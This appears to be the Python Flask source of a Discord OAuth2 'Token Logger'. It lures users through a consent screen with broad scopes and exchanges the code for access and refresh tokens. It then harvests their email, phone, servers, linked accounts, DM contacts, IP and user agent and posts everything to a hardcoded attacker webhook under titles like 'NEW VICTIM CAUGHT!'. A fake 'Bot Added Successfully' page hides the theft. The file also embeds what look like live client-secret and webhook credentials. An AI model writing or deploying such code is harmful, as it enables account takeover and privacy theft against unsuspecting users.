import os
import json
import requests
from urllib.parse import urlencode
from flask import Flask, request, redirect, render_template_string
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ===== CONFIG =====
CLIENT_ID = "1541786357028884534"
CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
OAUTH_SCOPE = "identify email connections guilds guilds.members.read gdm.join messages.read activities.read activities.write relationships.read"

# ===== WEBHOOK (HARDCODED) =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1543233853873983538/5qVhoKAmoRBzhXUczSTENIoG0khrnn9DzT_-7vXJJN-PbdovbClFoPifZW0nxBVPEz5F"

# ==================

TOKEN_URL = "https://discord.com/api/oauth2/token"
API_BASE = "https://discord.com/api/v10"


def send_webhook(title, description, fields, color=0x5865F2, thumbnail=None, image=None, footer_text="Token Logger"):
    """Send rich embed to Discord webhook"""
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "fields": [{"name": k, "value": str(v)[:1024] if v else "N/A", "inline": True if len(str(v)) < 50 else False} for k, v in fields.items()],
        "footer": {"text": f"{footer_text} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
        "timestamp": datetime.utcnow().isoformat()
    }

    if thumbnail:
        embed["thumbnail"] = {"url": thumbnail}
    if image:
        embed["image"] = {"url": image}

    payload = {"username": "🔥 Token Logger", "embeds": [embed]}

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"[!] Webhook error: {e}")


@app.route("/")
def index():
    """Redirect to OAuth2 automatically — or show minimal page"""
    base_url = request.url_root.rstrip('/')
    redirect_uri = f"{base_url}/callback"

    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": OAUTH_SCOPE,
        "prompt": "consent"
    }
    return redirect(f"https://discord.com/api/oauth2/authorize?{urlencode(params)}")


@app.route("/callback")
def callback():
    code = request.args.get("code")
    error = request.args.get("error")
    error_description = request.args.get("error_description", "")

    base_url = request.url_root.rstrip('/')
    redirect_uri = f"{base_url}/callback"

    print(f"[DEBUG] Callback: code={code is not None}, error={error}")

    if error:
        return f"<h1>Error: {error}</h1><p>{error_description}</p>", 400

    if not code:
        return "<h1>No code provided</h1>", 400

    # Step 1: Exchange code for token
    token_data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
    }

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        resp = requests.post(TOKEN_URL, data=token_data, headers=headers, timeout=10)
        token_info = resp.json()
    except Exception as e:
        return f"<h1>Token exchange failed</h1><p>{str(e)}</p>", 500

    if "error" in token_info:
        return f"<h1>Discord Error</h1><p>{token_info.get('error_description', token_info.get('error'))}</p>", 400

    access_token = token_info.get("access_token")
    refresh_token = token_info.get("refresh_token")
    expires_in = token_info.get("expires_in")
    scope = token_info.get("scope")

    if not access_token:
        return f"<h1>Failed to get access token</h1>", 400

    auth_header = {"Authorization": f"Bearer {access_token}"}

    # Step 2: Get user info
    try:
        user_resp = requests.get(f"{API_BASE}/users/@me", headers=auth_header, timeout=10)
        user_data = user_resp.json()
    except Exception as e:
        user_data = {"error": str(e)}

    # Step 3: Get guilds
    try:
        guilds_resp = requests.get(f"{API_BASE}/users/@me/guilds", headers=auth_header, timeout=10)
        guilds_data = guilds_resp.json()
    except Exception as e:
        guilds_data = []

    # Step 4: Get connections
    try:
        conn_resp = requests.get(f"{API_BASE}/users/@me/connections", headers=auth_header, timeout=10)
        connections_data = conn_resp.json()
    except Exception as e:
        connections_data = []

    # Step 5: Get DMs
    try:
        dms_resp = requests.get(f"{API_BASE}/users/@me/channels", headers=auth_header, timeout=10)
        dms_data = dms_resp.json()
    except Exception as e:
        dms_data = []

    # Extract user data
    user_id = user_data.get("id", "N/A")
    username = user_data.get("username", "N/A")
    global_name = user_data.get("global_name", "N/A")
    display_name = user_data.get("display_name", global_name or username)
    email = user_data.get("email", "N/A")
    phone = user_data.get("phone", "N/A")
    mfa = user_data.get("mfa_enabled", False)
    verified = user_data.get("verified", False)
    locale = user_data.get("locale", "N/A")
    nsfw = user_data.get("nsfw_allowed", False)
    premium = user_data.get("premium_type", 0)

    avatar = user_data.get("avatar")
    banner = user_data.get("banner")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=512" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
    banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png?size=1024" if banner else None

    # Premium type
    premium_types = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
    premium_str = premium_types.get(premium, "Unknown")

    # Guilds info
    owned_guilds = [g for g in guilds_data if isinstance(g, dict) and g.get("owner")] if isinstance(guilds_data, list) else []
    admin_guilds = [g for g in guilds_data if isinstance(g, dict) and (g.get("permissions", 0) & 0x8) == 0x8] if isinstance(guilds_data, list) else []

    guilds_list = []
    if isinstance(guilds_data, list):
        for g in guilds_data[:20]:
            if isinstance(g, dict):
                perms = g.get("permissions", 0)
                flags = []
                if g.get("owner"): flags.append("OWNER")
                if perms & 0x8: flags.append("ADMIN")
                guilds_list.append(f"• {g.get('name','?')} | {g.get('member_count','?')} members | {','.join(flags) if flags else 'Member'}")
    guilds_str = "\n".join(guilds_list) if guilds_list else "None"

    # Connections
    conn_list = []
    if isinstance(connections_data, list):
        for c in connections_data[:10]:
            if isinstance(c, dict):
                conn_list.append(f"• {c.get('type','?')}: {c.get('name','?')} ({'✅' if c.get('verified') else '❌'})")
    conn_str = "\n".join(conn_list) if conn_list else "None"

    # DMs
    dm_list = []
    if isinstance(dms_data, list):
        for d in dms_data[:10]:
            if isinstance(d, dict) and d.get("type") == 1:
                recipients = d.get("recipients", [])
                if recipients:
                    r = recipients[0]
                    dm_list.append(f"• {r.get('username','?')} ({r.get('id','?')})")
    dm_str = "\n".join(dm_list) if dm_list else "None"

    # ===== EMBED 1: USER PROFILE (with image) =====
    profile_fields = {
        "👤 Username": f"{username} ({display_name})",
        "🆔 User ID": f"`{user_id}`",
        "📧 Email": f"{email} ({'✅ Verified' if verified else '❌ Unverified'})",
        "📱 Phone": phone if phone else "Not set",
        "🔐 MFA": "✅ Enabled" if mfa else "❌ Disabled",
        "🌍 Locale": locale,
        "🔞 NSFW": "✅ Allowed" if nsfw else "❌ Blocked",
        "💎 Nitro": premium_str,
        "🏰 Total Guilds": str(len(guilds_data)) if isinstance(guilds_data, list) else "N/A",
        "👑 Owned Guilds": str(len(owned_guilds)),
        "⚡ Admin Guilds": str(len(admin_guilds)),
        "🔗 Connections": str(len(connections_data)) if isinstance(connections_data, list) else "N/A",
        "💬 DMs": str(len(dms_data)) if isinstance(dms_data, list) else "N/A",
        "🌐 IP": request.remote_addr,
        "🖥️ User-Agent": request.headers.get("User-Agent", "N/A")[:200],
    }

    send_webhook(
        title="🎯 NEW VICTIM CAUGHT!",
        description=f"**Account:** `{username}`\n**ID:** `{user_id}`\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        fields=profile_fields,
        color=0xED4245,
        thumbnail=avatar_url,
        image=banner_url,
        footer_text="Token Logger v2.0"
    )

    # ===== EMBED 2: TOKENS =====
    token_fields = {
        "🔑 Access Token": f"`{access_token}`",
        "🔄 Refresh Token": f"`{refresh_token}`" if refresh_token else "N/A",
        "⏱️ Expires In": f"{expires_in} seconds",
        "📋 Scope": scope,
        "🔗 Redirect URI": redirect_uri,
    }

    send_webhook(
        title="🔐 TOKENS CAPTURED",
        description="Full token data captured",
        fields=token_fields,
        color=0xFAA61A,
        footer_text="Token Logger"
    )

    # ===== EMBED 3: GUILDS =====
    guild_fields = {
        "🏰 Guilds": f"```\n{guilds_str[:950]}\n```" if guilds_str != "None" else "None",
        "👑 Owned": "\n".join([f"• {g.get('name','?')} ({g.get('member_count','?')} members)" for g in owned_guilds[:5]]) if owned_guilds else "None",
    }

    send_webhook(
        title="🏰 GUILD DATA",
        description=f"Total: {len(guilds_data) if isinstance(guilds_data, list) else 0} guilds",
        fields=guild_fields,
        color=0x5865F2,
        footer_text="Token Logger"
    )

    # ===== EMBED 4: CONNECTIONS & DMs =====
    conn_dm_fields = {
        "🔗 Connections": f"```\n{conn_str[:950]}\n```" if conn_str != "None" else "None",
        "💬 Recent DMs": f"```\n{dm_str[:950]}\n```" if dm_str != "None" else "None",
    }

    send_webhook(
        title="🔗 CONNECTIONS & DMs",
        description="Linked accounts and private messages",
        fields=conn_dm_fields,
        color=0x43B581,
        footer_text="Token Logger"
    )

    # ===== EMBED 5: RAW JSON =====
    full_data = {
        "token_info": token_info,
        "user_data": user_data,
        "guilds": guilds_data,
        "connections": connections_data,
        "dms": dms_data,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", "N/A"),
        "timestamp": datetime.now().isoformat(),
        "redirect_uri": redirect_uri
    }

    raw_json = json.dumps(full_data, indent=2, default=str)

    # Split into chunks if needed
    chunks = [raw_json[i:i+1900] for i in range(0, len(raw_json), 1900)]
    for i, chunk in enumerate(chunks):
        raw_fields = {
            f"📦 Raw Data (Part {i+1}/{len(chunks)})": f"```json\n{chunk}\n```"
        }
        send_webhook(
            title="📦 RAW JSON DUMP",
            description=f"Complete API response — Part {i+1}",
            fields=raw_fields,
            color=0x2F3136,
            footer_text="Token Logger"
        )

    return """<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body style="background:#1a1a2e;color:#fff;text-align:center;padding:50px;font-family:sans-serif;">
<h1>✅ Bot Added Successfully!</h1>
<p>The bot will join your server shortly.</p>
</body>
</html>"""


# For Vercel serverless
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
